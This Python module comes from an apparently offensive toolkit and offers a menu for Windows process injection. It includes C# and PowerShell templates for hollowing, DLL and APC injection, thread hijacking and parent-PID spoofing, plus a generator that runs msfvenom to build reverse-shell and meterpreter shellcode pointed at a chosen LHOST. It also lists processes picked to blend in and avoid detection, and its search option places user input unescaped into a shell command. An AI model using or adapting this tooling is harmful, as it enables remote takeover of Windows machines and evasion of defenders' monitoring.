"""Process Injection Module - Process hollowing, DLL injection, APC injection, PPID spoofing."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "proc_hollow"

INJECTION_TEMPLATES = {
    "Process Hollowing (C#)": {
        "desc": "Spawn suspended process → unmap → write shellcode → resume",
        "code": r"""// Process Hollowing - C# Template
using System;
using System.Runtime.InteropServices;

class ProcessHollow {
    [DllImport("kernel32.dll")] static extern bool CreateProcess(string app, string cmd, IntPtr procAttr, IntPtr threadAttr, bool inherit, uint flags, IntPtr env, string dir, byte[] si, byte[] pi);
    [DllImport("ntdll.dll")] static extern uint NtUnmapViewOfSection(IntPtr proc, IntPtr baseAddr);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr proc, IntPtr baseAddr, byte[] buffer, uint size, out uint written);
    [DllImport("kernel32.dll")] static extern uint ResumeThread(IntPtr thread);

    // Steps:
    // 1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED)
    // 2. NtUnmapViewOfSection(process, imageBase)
    // 3. VirtualAllocEx(process, imageBase, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    // 4. WriteProcessMemory(process, imageBase, payload, size)
    // 5. SetThreadContext(thread, context with new entry point)
    // 6. ResumeThread(thread)
}""",
    },
    "DLL Injection (C#)": {
        "desc": "Inject DLL into running process via CreateRemoteThread",
        "code": r"""// DLL Injection - C# Template
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class DllInjector {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out uint written);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string name);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);

    // Steps:
    // 1. OpenProcess(PROCESS_ALL_ACCESS, targetPID)
    // 2. VirtualAllocEx → allocate memory for DLL path
    // 3. WriteProcessMemory → write DLL path string
    // 4. GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")
    // 5. CreateRemoteThread → call LoadLibrary with DLL path
}""",
    },
    "APC Injection (C#)": {
        "desc": "Queue shellcode via Asynchronous Procedure Call",
        "code": r"""// APC Injection - C# Template
using System;
using System.Runtime.InteropServices;

class ApcInjector {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out uint written);
    [DllImport("kernel32.dll")] static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
    [DllImport("kernel32.dll")] static extern uint QueueUserAPC(IntPtr func, IntPtr thread, IntPtr param);

    // Steps:
    // 1. OpenProcess → get handle to target
    // 2. VirtualAllocEx → allocate RWX memory
    // 3. WriteProcessMemory → write shellcode
    // 4. Enumerate threads of target process
    // 5. QueueUserAPC → queue shellcode on each alertable thread
}""",
    },
    "Thread Hijacking": {
        "desc": "Suspend thread → modify context → point to shellcode → resume",
        "code": r"""// Thread Hijacking - PowerShell
// Steps:
// 1. Get-Process target | Select Threads
// 2. SuspendThread(threadHandle)
// 3. GetThreadContext(threadHandle)
// 4. VirtualAllocEx + WriteProcessMemory (shellcode)
// 5. SetThreadContext → set RIP/EIP to shellcode
// 6. ResumeThread(threadHandle)""",
    },
    "PPID Spoofing": {
        "desc": "Spoof parent process ID to evade detection",
        "code": r"""// PPID Spoofing - PowerShell
$parentPid = (Get-Process explorer).Id
$si = New-Object STARTUPINFOEX
$lpSize = [IntPtr]::Zero
InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$lpSize)
$si.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
InitializeProcThreadAttributeList($si.lpAttributeList, 1, 0, [ref]$lpSize)
$parentHandle = OpenProcess(0x1F0FFF, $false, $parentPid)
UpdateProcThreadAttribute($si.lpAttributeList, 0, 0x00020000, $parentHandle, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)
CreateProcess("C:\Windows\System32\cmd.exe", ..., EXTENDED_STARTUPINFO_PRESENT, ..., $si)
// cmd.exe now shows explorer.exe as parent in Process Explorer""",
    },
}


def _show_technique(session):
    """Display injection technique templates."""
    options = [(str(i+1), f"[bold]{name}[/bold] - {t['desc']}") for i, (name, t) in enumerate(INJECTION_TEMPLATES.items())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    techniques = list(INJECTION_TEMPLATES.items())
    if 0 <= idx < len(techniques):
        name, tech = techniques[idx]
        console.print(f"\n[bold cyan]{name}[/bold cyan]")
        console.print(f"[dim]{tech['desc']}[/dim]\n")
        console.print(f"[white]{tech['code']}[/white]")


def _shellcode_gen(session):
    """Generate shellcode for injection via msfvenom."""
    info("Generate shellcode for process injection:")

    options = [
        ("1", "[bold]Windows x64 reverse TCP[/bold]"),
        ("2", "[bold]Windows x64 meterpreter[/bold]"),
        ("3", "[bold]Windows x86 reverse TCP[/bold]"),
        ("4", "[bold]Custom msfvenom[/bold]"),
    ]
    choice = show_menu(options)

    lhost = ask("Enter LHOST (your IP)")
    lport = ask("Enter LPORT", default="4444")

    payloads = {
        "1": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f csharp -b '\\x00'",
        "2": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f csharp -b '\\x00'",
        "3": f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f csharp -b '\\x00'",
    }

    if choice == "4":
        payload = ask("Enter msfvenom payload name")
        fmt = ask("Output format (csharp/raw/exe/dll)", default="csharp")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -b '\\x00'"
    elif choice in payloads:
        cmd = payloads[choice]
    else:
        return

    fmt_choice = ask("Additional format? (raw/python/powershell/hex)", default="")
    if fmt_choice:
        cmd = cmd.replace("-f csharp", f"-f {fmt_choice}")

    run_with_preview(cmd, session, STAGE)


def _list_processes(session):
    """List processes for target selection."""
    options = [
        ("1", "[bold]All processes[/bold]"),
        ("2", "[bold]Search by name[/bold]"),
        ("3", "[bold]Common targets[/bold]"),
    ]
    choice = show_menu(options)

    if choice == "1":
        run_with_preview("ps aux 2>/dev/null || tasklist", session, STAGE)
    elif choice == "2":
        name = ask("Process name to search")
        run_with_preview(f"ps aux | grep -i {name} 2>/dev/null || tasklist | findstr /i {name}", session, STAGE)
    elif choice == "3":
        info("Common injection targets (appear legitimate):")
        targets = [
            "svchost.exe    — Service Host (many instances normal)",
            "explorer.exe   — Windows Explorer",
            "RuntimeBroker.exe — Runtime Broker",
            "dllhost.exe    — COM Surrogate",
            "notepad.exe    — Notepad (easy target, conspicuous)",
            "iexplore.exe   — Internet Explorer (legacy)",
        ]
        for t in targets:
            console.print(f"  [cyan]•[/cyan] {t}")


def _cheat_sheet():
    content = """# Process Injection Cheat Sheet

## Techniques (MITRE T1055)
1. **Process Hollowing** (T1055.012) — Unmap legitimate code, write payload
2. **DLL Injection** (T1055.001) — LoadLibrary via CreateRemoteThread
3. **APC Injection** (T1055.004) — Queue shellcode on alertable thread
4. **Thread Hijacking** — Suspend → modify context → resume
5. **PPID Spoofing** — Fake parent PID to evade tree-based detection

## Key Windows APIs
```
OpenProcess          — Get process handle
VirtualAllocEx       — Allocate memory in remote process
WriteProcessMemory   — Write shellcode/DLL path
CreateRemoteThread   — Execute in remote process
NtUnmapViewOfSection — Unmap original code (hollowing)
QueueUserAPC         — Queue async procedure call
SuspendThread/ResumeThread — Thread manipulation
```

## Detection
- Sysmon Event ID 8 (CreateRemoteThread)
- Sysmon Event ID 10 (ProcessAccess)
- Memory page RWX permissions
- Suspicious parent-child process relationships

## Good Injection Targets
- svchost.exe (many instances = blend in)
- RuntimeBroker.exe
- dllhost.exe
"""
    show_knowledge(content)


def run(session):
    """Process Injection module entry point."""
    show_stage_header("Process Injection", "Hollowing, DLL inject, APC injection, PPID spoofing")

    while True:
        options = [
            ("1", "[bold]Injection Templates[/bold] - View technique code"),
            ("2", "[bold]Shellcode Generator[/bold] - msfvenom shellcode"),
            ("3", "[bold]List Processes[/bold]      - Find injection targets"),
            ("4", "[bold]Cheat Sheet[/bold]         - Injection reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _show_technique(session)
        elif choice == "2":
            _shellcode_gen(session)
        elif choice == "3":
            _list_processes(session)
        elif choice == "4":
            _cheat_sheet()
